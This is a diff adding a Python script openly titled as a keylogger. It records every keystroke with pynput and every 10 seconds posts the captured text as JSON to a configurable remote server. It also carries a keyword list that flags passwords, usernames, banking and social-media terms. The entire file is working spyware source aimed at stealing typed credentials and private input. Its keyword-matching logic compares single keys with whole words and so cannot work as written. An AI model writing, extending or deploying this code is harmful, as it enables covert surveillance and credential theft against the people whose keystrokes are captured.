@@ -1,0 +1,77 @@
+#My Keylogging Script
+
+from pynput import keyboard
+import requests
+import json
+import threading
+
+text = ""
+config = {
+    "ipaddress": "your_server_ip",
+    "portnumber": "8080",
+}
+ipaddress = config["ipaddress"]
+portnumber = config["portnumber"]
+time_interval = 10
+
+class TextColors:
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    YELLOW = '\033[93m'
+    BLUE = '\033[94m'
+    RESET = '\033[0m'
+
+keywords_to_color = {
+    "gmail": TextColors.RED,
+    "facebook": TextColors.GREEN,
+    "bank": TextColors.RED,
+    "account": TextColors.RED,
+    "twitter": TextColors.GREEN,
+    "social": TextColors.GREEN,
+    "password": TextColors.RED,
+    "username": TextColors.RED,
+    "name": TextColors.RED,
+    "instagram": TextColors.GREEN,
+    "snapchat": TextColors.GREEN,
+    "google": TextColors.RED,
+}
+
+def send_post_req():
+    try:
+        payload = json.dumps({"keyboardData": text})
+        r = requests.post(f"http://{ipaddress}:{portnumber}", data=payload, headers={"Content-Type": "application/json"})
+        timer = threading.Timer(time_interval, send_post_req)
+        timer.start()
+    except:
+        print("Couldn't complete request")
+
+def on_press(key):
+    global text
+
+    if key == keyboard.Key.enter:
+        text += "\n"
+    elif key == keyboard.Key.tab:
+        text += "\t"
+    elif key == keyboard.Key.space:
+        text += " "
+    elif key == keyboard.Key.shift:
+        pass
+    elif key == keyboard.Key.backspace and len(text) == 0:
+        pass
+    elif key == keyboard.Key.backspace and len(text) > 0:
+        text = text[:-1]
+    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+        pass
+    elif key == keyboard.Key.esc:
+        return False
+    else:
+        pressed_key = str(key).strip("'")
+        text += color_code_keyword(pressed_key)
+
+def color_code_keyword(word):
+    # Check if the word is a keyword and apply the corresponding color code
+    return keywords_to_color.get(word, word)
+
+with keyboard.Listener(on_press=on_press) as listener:
+    send_post_req()
+    listener.join()
